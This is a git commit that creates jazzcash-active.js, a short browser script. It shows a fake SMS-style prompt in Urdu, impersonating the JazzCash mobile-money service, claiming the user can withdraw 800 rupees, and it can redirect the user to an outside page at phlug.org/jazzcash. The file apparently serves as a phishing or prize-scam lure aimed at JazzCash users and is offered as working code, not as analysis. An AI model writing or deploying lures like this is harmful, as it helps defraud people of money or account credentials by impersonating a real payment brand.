9d3d5bdeb85300c781d53aac55821c4763f9280f
itidnewblog4 <ukpehaitid2@gmail.com>
2025-09-23 08:59:03 +0100

    Create jazzcash-active.js

---
+++ jazzcash-active.js
@@ -0,0 +1,5 @@
+var password = '800 روپے نکالیں۔'
+password=prompt('SMS: مبارک ہو، آپ کا JazzCash اکاؤنٹ نمبر 800 روپے وصول کرنے کا اہل ہے، کیش نکالنے کے لیے OK پر کلک کریں','800 روپے نکالیں۔');
+if (password != '800 روپے نکالیں۔') {
+location.href='https://phlug.org/jazzcash';
+}
